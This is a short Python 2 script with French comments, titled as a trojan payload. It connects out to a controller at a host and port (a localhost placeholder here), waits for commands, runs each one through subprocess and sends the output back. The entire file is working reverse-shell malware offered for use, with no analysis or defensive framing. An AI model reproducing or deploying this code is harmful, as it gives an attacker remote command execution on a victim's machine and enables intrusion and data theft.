##
# SIMPLE PAYLOAD FOR TROJAN PYTHON 

import socket
import subprocess

# Cible
target_host = "127.0.0.1"
target_port = 8080
localIp = socket.gethostbyname(socket.gethostname())

# Creation de l'objet socket avec python
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((target_host,target_port))

#fonction commande
def run_command(cmd):
#Donne le shell
    return subprocess.Popen(cmd, 
                            stdout=subprocess.PIPE, 
                            stderr=subprocess.PIPE, 
                            stdin=subprocess.PIPE).communicate()

# Reception des commandes depuis le trojan
while True:
	response = client.recv(4096)
	outputCommand =  run_command(response)[0]
	client.sendall(outputCommand)
	print outputCommand


